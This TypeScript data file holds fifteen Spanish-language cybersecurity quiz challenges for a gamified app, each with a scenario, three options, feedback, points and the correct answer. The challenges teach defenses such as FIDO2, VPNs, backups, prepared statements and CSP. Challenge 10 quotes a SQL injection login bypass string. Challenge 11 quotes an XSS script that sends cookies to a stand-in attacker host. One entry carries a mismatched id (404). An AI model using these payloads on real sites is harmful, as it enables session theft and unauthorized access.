import { GameplayMission } from '../../types';
import { BCV_RATE_STRING } from '../bcvServiceFallback';

export const CIBERSEGURIDAD_15_CHALLENGES: GameplayMission[] = [
  // Desafío 1 (501)
  {
    id: 501,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 1,
    level_title: "Desafío 1 de 15: Ataques AiTM y Robo de Sesiones",
    title: "Enfrentando Proxies Adversarios y Secuestro de Cookies",
    source_text: "Un atacante despliega una infraestructura de phishing con proxy inverso inverso (Evilginx) capaz de interceptar códigos OTP enviados por SMS y clonar cookies de sesión autenticadas.",
    question: "¿Cuál es la contramedida criptográfica definitiva resistente al phishing (Phishing-Resistant MFA)?",
    options: [
      {
        id: 1,
        text: "Desplegar llaves de seguridad físicas de hardware FIDO2 o Passkeys criptográficas basadas en WebAuthn.",
        feedback_immediate: "¡Blindaje Criptográfico de Élite! Las llaves FIDO2 y Passkeys vinculan la autenticación al dominio criptográfico real impidiendo el desvío por proxies AiTM.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Pedir que el código SMS se envíe dos veces seguidas al teléfono celular.",
        feedback_immediate: "El proxy inverso captura ambos códigos y clona la sesión de todos modos sin importar las repeticiones.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Cambiar el color del fondo de pantalla del navegador web.",
        feedback_immediate: "Acción cosmética que no ofrece ninguna protección contra interceptaciones a nivel de protocolo de red.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "kael_rivera",
    bonus_tag: "Torre de Defensa FIDO2 de Jorge (+15% Bonus)",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 2 (502)
  {
    id: 502,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 2,
    level_title: "Desafío 2 de 15: Arquitectura Zero Trust y Tokens",
    title: "Blindaje de APIs Bancarias y Encriptación de Sesiones",
    source_text: "En una arquitectura Zero Trust ('Nunca confíes, siempre verifica'), un atacante intenta reutilizar un token de acceso robado desde una IP desconocida en el extranjero para autorizar un pago.",
    question: "¿Qué mecanismo de seguridad anula de inmediato el uso del token robado?",
    options: [
      {
        id: 1,
        text: "Demostración de Posesión (DPoP / mTLS) y tokens efímeros de corta vida vinculados a la clave privada del cliente emisor legítimo.",
        feedback_immediate: "¡Defensa Zero Trust Impecable! Con DPoP o mTLS el token robado resulta inútil porque el atacante no posee la clave privada criptográfica del dispositivo emisor.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Usar tokens JWT estáticos que nunca expiran y guardarlos en una hoja de Excel en el escritorio.",
        feedback_immediate: "Los tokens perpetuos sin expiración constituyen una de las mayores vulnerabilidades en sistemas bancarios y APIs corporativas.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Confiar ciegamente en cualquier petición que provenga de una red privada virtual gratuita.",
        feedback_immediate: "El modelo Zero Trust prohíbe la confianza implícita, incluso dentro de supuestas redes privadas o VPNs no autenticadas.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "kael_rivera",
    bonus_tag: "Arquitectura Zero Trust de Jorge",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 3 (503)
  {
    id: 503,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 3,
    level_title: "Desafío 3 de 15: Vishing, Deepfakes y Verificación",
    title: "Ingeniería Social Telefónica con Clonación de Voz por IA",
    source_text: "Recibes una llamada urgente con la voz idéntica de tu supervisor de nómina, generada con IA mediante deepfake de audio, ordenando transferir fondos a una cuenta externa de emergencia por una supuesta auditoría confidencial.",
    question: "¿Qué protocolo de defensa de seguridad humana y corporativa neutraliza este ataque?",
    options: [
      {
        id: 1,
        text: "Suspender la llamada y ejecutar una verificación fuera de banda (Out-of-band) por un canal seguro preacordado o palabra clave interna cifrada.",
        feedback_immediate: "¡Defensa contra Deepfakes Magistral! La verificación fuera de banda desarticula la ingeniería social avanzada y la suplantación biométrica sintética.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Transferir los fondos de inmediato porque la voz sonaba exactamente igual y sonaba muy angustiada.",
        feedback_immediate: "Las IAs actuales clonan voces humanas con solo 3 segundos de muestra de audio; confiar ciegamente causa desfalcos masivos.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Pedirle al atacante por la misma llamada telefónica que jure que no es una IA generativa.",
        feedback_immediate: "Interrogar al atacante por el mismo canal comprometido no ofrece ninguna garantía de seguridad.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "dante_albornoz",
    bonus_tag: "Detección Forense de Deepfakes de Iván",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 4 (504)
  {
    id: 404,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 4,
    level_title: "Desafío 4 de 15: Redes Wi-Fi Públicas y Ataques Evil Twin",
    title: "Protección en Aeropuertos y Cafeterías Públicas",
    source_text: "En un aeropuerto te conectas a una red Wi-Fi abierta llamada 'Wi-Fi_Gratis_Oficial'. No te pide contraseña y navegas de inmediato. Un ciberdelincuente montó una antena falsa (Evil Twin) para interceptar el tráfico de todos los pasajeros.",
    question: "¿Cómo te proteges frente al espionaje de paquetes en redes no confiables?",
    options: [
      {
        id: 1,
        text: "Activar una VPN cifrada de punto a punto (WireGuard/OpenVPN) que encripte todo el túnel de datos y forzar DNS sobre HTTPS (DoH).",
        feedback_immediate: "¡Túnel de cifrado indestructible! La VPN transforma cualquier red hostil en un canal opaco donde el atacante solo ve ruido cifrado indescifrable.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Abrir la app del banco sin VPN porque la pantalla del teléfono tiene protector de privacidad.",
        feedback_immediate: "Un protector de pantalla físico no evita la captura de paquetes que viajan por el aire de la red Wi-Fi.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Reiniciar el celular mientras estás conectado a la red falsa.",
        feedback_immediate: "Reiniciar el dispositivo no cifra el tráfico ni neutraliza la antena clonada.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "maya_chen",
    bonus_tag: "Túnel VPN Cifrado de Ircar",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 5 (505)
  {
    id: 505,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 5,
    level_title: "Desafío 5 de 15: Ransomware y Respaldo 3-2-1 Inmutable",
    title: "Continuidad del Negocio ante Secuestro Criptográfico de Datos",
    source_text: "Un servidor de tu empresa es infectado con ransomware que encripta toda la base de datos de facturación y exige $10,000 USD en criptomonedas para desbloquear los archivos.",
    question: "¿Qué política de respaldo previene pagar el rescate y recupera el sistema en pocas horas?",
    options: [
      {
        id: 1,
        text: "Estrategia de respaldo 3-2-1 con copias inmutables fuera de línea (Air-Gapped o WORM en la nube), lo que permite restaurar los datos sin pagar rescates a delincuentes.",
        feedback_immediate: "¡Resiliencia operativa legendaria! Los respaldos inmutables y aislados fuera de línea anulan la extorsión de cualquier cepa de ransomware.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Pagar el rescate inmediatamente confiando en la palabra de honor de los ciberextorsionadores.",
        feedback_immediate: "Pagar el rescate financia el crimen organizado y en más del 40% de los casos los criminales nunca entregan las llaves de descifrado.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Apagar la pantalla del monitor para que el virus no se propague.",
        feedback_immediate: "Apagar el monitor no detiene el proceso de cifrado que ocurre en el procesador y disco duro del servidor.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "kael_rivera",
    bonus_tag: "Respaldo Inmutable 3-2-1 de Jorge",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 6 (506)
  {
    id: 506,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 6,
    level_title: "Desafío 6 de 15: Seguridad Móvil y Permisos Abusivos",
    title: "Riesgos de Root / Jailbreak y Carga Lateral de APKs",
    source_text: "Un usuario instala un juego pirateado descargado desde una página web en formato APK para ahorrar dinero. La app solicita permisos de 'Accesibilidad', 'Leer mensajes SMS' y 'Superponerse a otras apps'.",
    question: "¿Qué peligro inminente enfrenta el teléfono y las cuentas bancarias del usuario?",
    options: [
      {
        id: 1,
        text: "La app es un troyano bancario que usará el servicio de accesibilidad para interceptar códigos SMS bancarios y pintar pantallas falsas sobre la app del banco para robar credenciales.",
        feedback_immediate: "¡Diagnóstico de malware móvil exacto! El abuso de APIs de accesibilidad y permisos de superposición es el método predilecto de los troyanos bancarios en Android.",
        points_delta: 100
      },
      {
        id: 2,
        text: "El juego simplemente necesita leer los SMS para saber a qué hora duerme el jugador.",
        feedback_immediate: "Ningún videojuego legítimo necesita interceptar mensajes SMS bancarios o controlar la pantalla táctil.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Descargar APKs modificadas es más seguro que usar tiendas oficiales verificadas.",
        feedback_immediate: "Las APKs de fuentes desconocidas suelen venir empaquetadas con spyware y puertas traseras.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "maya_chen",
    bonus_tag: "Blindaje Móvil de Ircar",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 7 (507)
  {
    id: 507,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 7,
    level_title: "Desafío 7 de 15: Smishing Bancario y Enlaces Maliciosos",
    title: "Detección de Mensajes de Texto de 'Alerta de Bloqueo'",
    source_text: "Recibes un SMS: 'BDV_Alerta: Su cuenta ha sido suspendida temporalmente por actividad inusual. Ingrese a http://banco-venezuela-desbloqueo.info para reactivarla antes de 1 hora.'",
    question: "¿Qué indicadores revelan el fraude cibernético de smishing?",
    options: [
      {
        id: 1,
        text: "La urgencia psicológica, el enlace con dominio ajeno a la web oficial del banco (.info en lugar del portal oficial) y el uso de protocolo HTTP no seguro.",
        feedback_immediate: "¡Neutralización de Smishing perfecta! Los bancos nunca envían enlaces para desbloquear cuentas bancarias mediante mensajes SMS.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Hacer clic en el enlace de inmediato e ingresar el número de tarjeta y clave secreta para no perder la cuenta.",
        feedback_immediate: "Ingresar tus datos en el sitio clonado entrega tus credenciales directamente a los atacantes.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Responder al SMS con tu código de coordenadas para que el banco lo resuelva por mensaje.",
        feedback_immediate: "Nunca compartas coordenadas o claves por SMS; son de uso exclusivo y personal.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "dante_albornoz",
    bonus_tag: "Detección de Smishing de Iván",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 8 (508)
  {
    id: 508,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 8,
    level_title: "Desafío 8 de 15: Relleno de Credenciales y Reutilización",
    title: "Ataques de Credential Stuffing y Gestores de Claves",
    source_text: "Un hacker compra una base de datos filtrada de un foro de películas donde tú usabas la contraseña 'clave123'. El hacker programa un bot para probar esa misma contraseña en 50 bancos y tiendas en línea.",
    question: "¿Qué hábito de higiene digital anula por completo la efectividad de los ataques de relleno de credenciales?",
    options: [
      {
        id: 1,
        text: "Usar un gestor de contraseñas de código abierto o verificado para generar contraseñas únicas, largas y aleatorias para cada servicio sin repetirlas jamás.",
        feedback_immediate: "¡Higiene digital de primer nivel! Al no reutilizar contraseñas, la filtración de un sitio secundario no compromete el resto de tus cuentas críticas.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Usar 'clave123' en todas partes agregando solo un signo de exclamación al final.",
        feedback_immediate: "Las variaciones mínimas son predecibles y descifradas en microsegundos por los algoritmos de ataque.",
        points_delta: -25
      },
      {
        id: 3,
        text: "No usar contraseñas y dejar las cuentas abiertas para cualquiera.",
        feedback_immediate: "Dejar cuentas sin contraseña es una renuncia total a cualquier estándar de seguridad informática.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "maya_chen",
    bonus_tag: "Gestión Criptográfica de Ircar",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 9 (509)
  {
    id: 509,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 9,
    level_title: "Desafío 9 de 15: Ataques a la Cadena de Suministro de Software",
    title: "Typosquatting en Repositorios de Código Abierto (npm / PyPI)",
    source_text: "Un desarrollador escribe accidentalmente 'npm install expresss-security' (con triple 's') en lugar de la librería legítima. El paquete existe en el registro y descarga un script silencioso.",
    question: "¿Qué tipo de ataque ocurrió y qué herramienta preventiva de integración continua debió detectarlo?",
    options: [
      {
        id: 1,
        text: "Ataque de Typosquatting en la cadena de suministro; debe utilizarse bloqueo estricto de hashes con lockfile (package-lock.json), auditorías automáticas (npm audit) y firmas de dependencias.",
        feedback_immediate: "¡Protección DevSecOps extraordinaria! Asegurar las dependencias de software con lockfiles y auditorías previene la inyección de puertas traseras en producción.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Es un regalo del autor del paquete que mejora la velocidad del computador.",
        feedback_immediate: "Los paquetes con nombres tipográficos similares están diseñados maliciosamente para robar variables de entorno y claves API.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Ignorar los archivos package-lock.json para que las librerías se actualicen sin control.",
        feedback_immediate: "Ignorar lockfiles permite que se descarguen versiones corruptas sin verificación de integridad criptográfica.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "maya_chen",
    bonus_tag: "Auditoría DevSecOps de Ircar",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 10 (510)
  {
    id: 510,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 10,
    level_title: "Desafío 10 de 15: Inyección SQL y Parámetros Seguros",
    title: "Blindaje de Formularios y Consultas a Bases de Datos",
    source_text: "En un formulario web de inicio de sesión, un atacante ingresa en el campo de usuario: \"' OR 1=1; --\". Si el servidor concatena directamente el texto a la consulta SQL, el atacante ingresa sin conocer la contraseña.",
    question: "¿Cuál es la práctica de desarrollo seguro que erradica las inyecciones SQL (SQLi)?",
    options: [
      {
        id: 1,
        text: "Utilizar consultas preparadas parametrizadas (Prepared Statements) o un ORM seguro que separe estrictamente el código SQL de los datos ingresados por el usuario.",
        feedback_immediate: "¡Arquitectura de software segura perfecta! Las consultas preparadas tratan los datos del usuario como literales inofensivos sin ejecutarlos jamás como código.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Bloquear únicamente la palabra 'OR' en el frontend usando JavaScript de navegador.",
        feedback_immediate: "La validación en el frontend es fácilmente eludible enviando peticiones directas con herramientas como curl o Postman.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Guardar las contraseñas en texto plano sin hash para revisarlas manualmente.",
        feedback_immediate: "Guardar contraseñas en texto plano es una violación crítica de seguridad sancionada internacionalmente.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "dante_albornoz",
    bonus_tag: "Blindaje de Bases de Datos de Iván",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 11 (511)
  {
    id: 511,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 11,
    level_title: "Desafío 11 de 15: Cross-Site Scripting (XSS) y CSP",
    title: "Sanitización de Salidas y Políticas de Seguridad de Contenido",
    source_text: "Un foro web permite publicar comentarios sin escapar etiquetas HTML. Un atacante publica: \"<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>\". Cuando otros usuarios abren el post, sus sesiones son enviadas al atacante.",
    question: "¿Qué cabecera HTTP y técnica de renderizado detiene este ataque XSS?",
    options: [
      {
        id: 1,
        text: "Implementar Content Security Policy (CSP) restrictivo, marcar cookies críticas con HttpOnly y escapar/sanitizar todo el contenido generado por usuarios antes de renderizarlo.",
        feedback_immediate: "¡Mitigación XSS impecable! Con cookies HttpOnly el código JavaScript malicioso no puede acceder a las cookies de sesión, y CSP bloquea scripts no autorizados.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Permitir la ejecución de cualquier script siempre que esté escrito en letra cursiva.",
        feedback_immediate: "El estilo visual del texto no influye en la ejecución de scripts en el motor de JavaScript.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Desactivar el firewall del servidor web para agilizar la carga de comentarios.",
        feedback_immediate: "Desactivar el firewall expone al servidor a escaneos de puertos y ataques externos indiscriminados.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "maya_chen",
    bonus_tag: "Políticas CSP de Ircar",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 12 (512)
  {
    id: 512,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 12,
    level_title: "Desafío 12 de 15: Principio del Mínimo Privilegio (PoLP)",
    title: "Control de Accesos Basado en Roles (RBAC)",
    source_text: "Un pasante de diseño gráfico en una fintech solicita acceso para editar fotos. El administrador de sistemas le otorga credenciales de 'Super Administrador Root' con acceso de borrado total a la base de datos financiera por comodidad.",
    question: "¿Por qué esta asignación de permisos viola el Principio del Mínimo Privilegio?",
    options: [
      {
        id: 1,
        text: "Porque cada usuario debe poseer únicamente los permisos estrictamente indispensables para desempeñar su labor; un error o compromiso de la cuenta del pasante causaría la destrucción total del sistema.",
        feedback_immediate: "¡Gobernanza de accesos impecable! El Principio del Mínimo Privilegio limita el radio de impacto ante errores humanos o cuentas vulneradas.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Es una buena práctica porque así el pasante puede ayudar a transferir dinero si el tesorero está ocupado.",
        feedback_immediate: "Otorgar facultades financieras a usuarios sin acreditación propicia desfalcos y sanciones regulatorias.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Todos los empleados de cualquier empresa deben tener contraseña de root para evitar burocracia.",
        feedback_immediate: "Dar acceso root universal es una de las peores negligencias en seguridad de la información corporativa.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "kael_rivera",
    bonus_tag: "Control de Privilegios de Jorge",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 13 (513)
  {
    id: 513,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 13,
    level_title: "Desafío 13 de 15: Respuesta ante Incidentes y Rotación",
    title: "Contención Inmediata tras una Fuga de Claves",
    source_text: "Un ingeniero sube por error un archivo con la clave secreta maestra de la pasarela de pagos a un repositorio público de GitHub. A los 2 minutos se da cuenta del error.",
    question: "¿Cuál es el procedimiento de contención inmediata que debe ejecutar el equipo de ciberseguridad?",
    options: [
      {
        id: 1,
        text: "Revocar e invalidar la clave secreta de inmediato en el panel del proveedor, generar un nuevo secreto, rotarlo en producción y auditar los registros de acceso durante la ventana de exposición.",
        feedback_immediate: "¡Respuesta a incidentes magistral! Borrar el commit de Git no sirve porque los bots ya clonaron la clave; invalidar el secreto en el emisor es la única solución real.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Borrar el commit en GitHub y fingir que nada pasó esperando que nadie haya visto la clave.",
        feedback_immediate: "Los escáneres automatizados raspan repositorios públicos en milisegundos; ocultar el incidente deja la pasarela abierta al robo de fondos.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Esperar a fin de mes para cambiar la clave en la reunión de mantenimiento habitual.",
        feedback_immediate: "Esperar días o semanas garantiza que atacantes drenen fondos o instalen puertas traseras permanentes.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "kael_rivera",
    bonus_tag: "Respuesta Táctica a Incidentes de Jorge",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 14 (514)
  {
    id: 514,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 14,
    level_title: "Desafío 14 de 15: Monitoreo de Brechas de Seguridad",
    title: "Verificación de Filtraciones y Gestión de Identidad Digital",
    source_text: "Recibes una alerta de un servicio de monitoreo de brechas (como Have I Been Pwned) indicando que tu correo electrónico y contraseña hash fueron filtrados en un volcado de datos de una red social antigua.",
    question: "¿Qué acción preventiva debes tomar para proteger tu identidad financiera?",
    options: [
      {
        id: 1,
        text: "Cambiar la contraseña en ese servicio y en cualquier otra plataforma donde hayas utilizado esa misma clave o variaciones similares, activando 2FA en todas las cuentas críticas.",
        feedback_immediate: "¡Gestión proactiva de identidad digital! Actuar con celeridad antes de que los atacantes indexen las bases de datos neutraliza el riesgo de secuestro de cuentas.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Borrar el correo de advertencia considerándolo spam irrelevante.",
        feedback_immediate: "Ignorar alertas verificadas de brechas permite que atacantes utilicen tus credenciales filtradas sin que te enteres.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Publicar en redes sociales tu nueva contraseña para demostrar que ya la cambiaste.",
        feedback_immediate: "Hacer pública tu nueva contraseña entrega acceso instantáneo a cualquiera que lea la publicación.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "dante_albornoz",
    bonus_tag: "Monitoreo de Brechas de Iván",
    bcv_rate_context: BCV_RATE_STRING
  },
  // Desafío 15 (515)
  {
    id: 515,
    module_id: "ciberseguridad",
    module_name: "Ciberseguridad Real",
    level_number: 15,
    level_title: "Desafío 15 de 15: Mitigación de Ataques DDoS Masivos",
    title: "Defensa con Web Application Firewall (WAF) y Rate Limiting",
    source_text: "La plataforma de pagos recibe de repente 500,000 peticiones por segundo desde una botnet distribuida por todo el mundo, intentando saturar el ancho de banda y tumbar el servicio bancario.",
    question: "¿Qué arquitectura perimetral absorbe y mitiga esta avalancha maliciosa garantizando la disponibilidad?",
    options: [
      {
        id: 1,
        text: "Un Web Application Firewall (WAF) distribuido globalmente con protección Anycast DDoS, limitación de tasa (Rate Limiting) y desafíos de verificación criptográfica automatizada.",
        feedback_immediate: "¡Gran Maestro de Ciberseguridad Real! Has desplegado la Torre de Defensa definitiva, completando los 15 desafíos tácticos y alcanzando el rango máximo de CifraFlow.",
        points_delta: 100
      },
      {
        id: 2,
        text: "Desconectar el cable de red del servidor y cerrar la empresa por 3 meses.",
        feedback_immediate: "Desconectar la infraestructura otorga la victoria completa a los atacantes al lograr su objetivo de denegación de servicio.",
        points_delta: -25
      },
      {
        id: 3,
        text: "Pedirle a los clientes por Twitter que no usen la página web hasta nuevo aviso.",
        feedback_immediate: "Avisar a clientes no detiene el tráfico de la botnet automatizada de medio millón de peticiones por segundo.",
        points_delta: -25
      }
    ],
    correct_option_id: 1,
    bonus_avatar_id: "kael_rivera",
    bonus_tag: "Gran Maestro de Ciberseguridad de Jorge",
    bcv_rate_context: BCV_RATE_STRING
  }
];
